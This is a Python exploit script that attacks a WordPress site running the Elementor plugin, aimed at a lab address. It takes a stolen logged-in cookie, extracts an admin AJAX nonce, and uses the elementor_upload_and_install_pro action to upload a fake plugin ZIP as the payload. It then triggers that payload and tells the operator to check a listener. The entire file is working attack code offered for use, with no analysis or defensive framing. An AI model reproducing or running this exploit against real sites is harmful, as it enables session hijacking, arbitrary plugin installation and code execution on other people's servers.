#!/usr/bin/python
import requests
import re

# === Configuration ===
payloadFileName = 'elementor-pro.zip'  # ZIP file containing your fake plugin/payload
baseUrl = 'http://192.168.56.103/wordpress/'  # Base URL of the target WordPress site

# === Stolen Cookie ===
# Replace this with the actual stolen cookie (found in browser or intercept proxy)
cookies = {
    'wordpress_test_cookie': 'WP+Cookie+check',
    'wordpress_logged_in_123456abcdef123456abcdef123456ab': 'guest|1649876543|AbCdEfGhIjKlMnOpQrStUvWxYz123456abcdef123456abcdef123456ab'
}

# Start a session
session = requests.Session()

def GetNonce():
    print('[*] Trying to extract nonce using stolen cookie...')
    adminUrl = baseUrl + 'wp-admin/'
    response = session.get(adminUrl, cookies=cookies)

    # Match nonce from page source (from admin JS inline config)
    regexp = re.compile('"ajax":\\{"url":".+admin-ajax\\.php","nonce":"(.+?)"\\}')
    search = regexp.search(response.text)

    if not search:
        print('[!] Error - Could not extract nonce. Cookie may be expired or invalid.')
        # Uncomment to debug response:
        # print(response.text)
        return None
    else:
        nonce = search.group(1)
        print(f'[+] Nonce found: {nonce}')
        return nonce

def UploadFile(fileName, nonce):
    print('[*] Uploading payload...')
    uploadUrl = baseUrl + 'wp-admin/admin-ajax.php'
    data = {
        'action': 'elementor_upload_and_install_pro',
        '_nonce': nonce
    }
    files = {
        'fileToUpload': open(fileName, 'rb')
    }
    regexp = re.compile('"elementorProInstalled":true')
    response = session.post(uploadUrl, data=data, files=files, cookies=cookies)

    if regexp.search(response.text):
        print('[+] Upload completed successfully!')
        return True
    else:
        print('[!] Error - Upload failed.')
        # print(response.text)  # Uncomment to debug
        return False

def ActivatePayload():
    print('[*] Activating payload...')
    payloadUrl = baseUrl + 'index.php?activate=1'
    session.get(payloadUrl, cookies=cookies)
    print('[+] Payload triggered (check your listener or effect).')

# === Execution ===
nonce = GetNonce()
if nonce:
    if UploadFile(payloadFileName, nonce):
        ActivatePayload()

